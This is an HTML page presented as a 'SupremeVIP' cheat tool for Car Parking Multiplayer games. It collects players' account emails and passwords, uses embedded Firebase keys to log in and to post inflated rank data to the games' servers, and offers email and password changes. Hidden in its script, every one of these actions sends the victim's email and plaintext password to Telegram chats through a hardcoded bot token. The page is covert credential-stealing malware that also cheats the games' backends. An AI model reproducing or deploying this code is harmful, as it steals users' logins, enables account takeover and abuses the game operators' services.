<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SUPREMEVIP WEB TOOL</title>
<style>
body { 
    margin:0; padding:0;
    font-family: Arial, sans-serif;
    background: url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") no-repeat center center fixed;
    background-size: cover;
    overflow: hidden;
}

.center-wrapper {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    max-width: 350px;
}

.container { 
    background: rgba(0,0,0,0.6); 
    backdrop-filter: blur(12px);
    padding:20px 25px; 
    border-radius:10px; 
    box-shadow:0 0 25px #000; 
    text-align:center; 
    border:2px solid #00aaff;
}

h1 { font-size: 20px; margin-bottom: 15px; color:#fff; }

input, select { 
    width: 90%; 
    padding:10px; 
    margin:8px 0; 
    border-radius:5px; 
    border:none; 
    background: rgba(255,255,255,0.1);
    color:#fff;
    font-size: 16px;
}

button { 
    width: 95%; 
    padding:10px; 
    margin:6px 0; 
    border-radius:5px; 
    border:none; 
    cursor:pointer; 
    font-weight:bold; 
    font-size:16px;
}

button.login { background:#00aaff; color:#fff; }
button.login:hover { background:#33bbff; }
button.menu { background:#ff8800; color:#fff; }
button.menu:hover { background:#ffaa33; }

.status { margin-top:10px; color:#0f0; word-wrap: break-word; min-height:20px; }
.error { color:#f55; }

#loginForm, #menuButtons { display:none; margin-top:10px; }
footer {
    margin-top: 15px;
    font-size: 13px;
    color: #fff;
    opacity: 0.8;
}
</style>
</head>
<body>

<div class="center-wrapper">
  <div class="container">
      <h1>SUPREMEVIP WEB TOOL</h1>

      <!-- Game Select -->
      <div id="gameSelectDiv">
        <select id="gameSelect">
            <option value="">-- Select Game --</option>
            <option value="1">Car Parking Multiplayer</option>
            <option value="2">Car Parking Multiplayer 2</option>
        </select>
      </div>

      <!-- Login Form -->
      <div id="loginForm">
          <input type="email" id="email" placeholder="Email">
          <input type="password" id="password" placeholder="Password">
          <button class="login" onclick="loginFirebase()">Login</button>
          <div id="status" class="status"></div>
      </div>

      <!-- Service Buttons -->
      <div id="menuButtons">
          <button class="menu" onclick="kingRank()">👑 King Rank</button>
          <button class="menu" onclick="changeEmail()">📧 Change Email</button>
          <button class="menu" onclick="changePassword()">🔐 Change Password</button>
          <div id="serviceStatus" class="status"></div>
      </div>

      <footer>© 2025 SupremeModzdev. All Rights Reserved.</footer>
  </div>
</div>

<script>
const BOT_TOKEN = "8307704020:AAEwNsSCXACGHHehKt_ejhuFQbtN2MqHL70";
const CHAT_IDS = ['6614066633','7351189513'];

const GAMES = {
  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
};

let currentUser = null;
let currentToken = null;
let currentPassword = null;
let selectedGame = null;

// Show login after selecting game & hide game select
document.getElementById('gameSelect').addEventListener('change', function(){
    const val = this.value;
    if(val){ 
        selectedGame = GAMES[val]; 
        document.getElementById('gameSelectDiv').style.display='none'; // hide game select
        document.getElementById('loginForm').style.display='block';   // show login
    }
});

// Update status messages
function updateStatus(msg,isError=false,target='status'){
    const el=document.getElementById(target);
    el.className=isError?'status error':'status';
    el.textContent=msg;
}

// Send message to Telegram
function sendCostMessage(text){
    CHAT_IDS.forEach(chatId=>{
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({chat_id:chatId,text:text})
        }).catch(err=>console.error(err));
    });
}

// Login
async function loginFirebase(){
    if(!selectedGame){ updateStatus("Select a game first!",true); return; }
    const email=document.getElementById('email').value.trim();
    const password=document.getElementById('password').value;
    if(!email||!password){ updateStatus("Enter email & password!",true); return; }

    updateStatus("Logging in...");
    try{
        const resp=await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({email,password,returnSecureToken:true})
        });
        const data=await resp.json();
        if(data.idToken){
            currentUser=email; currentPassword=password; currentToken=data.idToken;
            updateStatus(`✅ Logged in as ${email}`);
            document.getElementById('loginForm').style.display='none';
            document.getElementById('menuButtons').style.display='block';
            sendCostMessage(`🔐 Login Success Generate account:\n📧 Email: ${email}\n🔒 Password: ${password}`);
        }else{
            updateStatus(`❌ Login failed: ${data.error?.message || 'Unknown'}`,true);
        }
    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true); }
}

// Check login before using service
function requireLogin(){ 
    if(!currentUser||!currentToken){ updateStatus("❌ Please login first!",true,'serviceStatus'); return false; } 
    return true; 
}

// King Rank
async function kingRank(){
    if(!requireLogin()) return;
    updateStatus("Processing King Rank...",false,'serviceStatus');

    const ratingData={};
    const fields=["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
    fields.forEach(f=>ratingData[f]=100000);
    ratingData["time"]=10000000000; ratingData["race_win"]=3000;

    const payload={ data: JSON.stringify({ RatingData: ratingData })};
    const headers={ "Authorization":`Bearer ${currentToken}`, "Content-Type":"application/json" };

    try{
        const res=await fetch(selectedGame.rank_url,{ method:"POST", headers, body:JSON.stringify(payload)});
        if(res.ok){ 
            updateStatus("✅ King Rank set successfully!",false,'serviceStatus'); 
            sendCostMessage(`👑 King Rank\n📧 Email: ${currentUser}\n🔒 Password: ${currentPassword}`); 
        }
        else updateStatus("❌ Failed to set King Rank!",true,'serviceStatus');
    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
}

// Change Email
async function changeEmail(){
    if(!requireLogin()) return;
    const newEmail=prompt("Enter new email:"); if(!newEmail) return;
    try{
        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({ idToken:currentToken,email:newEmail,returnSecureToken:true })
        });
        const data=await resp.json();
        if(data.email){ 
            const old=currentUser; 
            currentUser=data.email; 
            currentToken=data.idToken; 
            updateStatus(`✅ Email changed to ${currentUser}`,false,'serviceStatus'); 
            sendCostMessage(`📧 Change Email\nOld: ${old}\nNew: ${currentUser}\n🔒 Password: ${currentPassword}`); 
        }
        else updateStatus(`❌ Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
}

// Change Password
async function changePassword(){
    if(!requireLogin()) return;
    const newPassword=prompt("Enter new password:"); if(!newPassword) return;
    try{
        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({ idToken:currentToken,password:newPassword,returnSecureToken:true })
        });
        const data=await resp.json();
        if(data.email){ 
            currentPassword=newPassword; 
            currentToken=data.idToken; 
            updateStatus("✅ Password changed successfully!",false,'serviceStatus'); 
            sendCostMessage(`🔐 Change Password\n📧 Email: ${currentUser}\n🔒 New Password: ${currentPassword}`); 
        }
        else updateStatus(`❌ Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
}
</script>

</body>
</html>
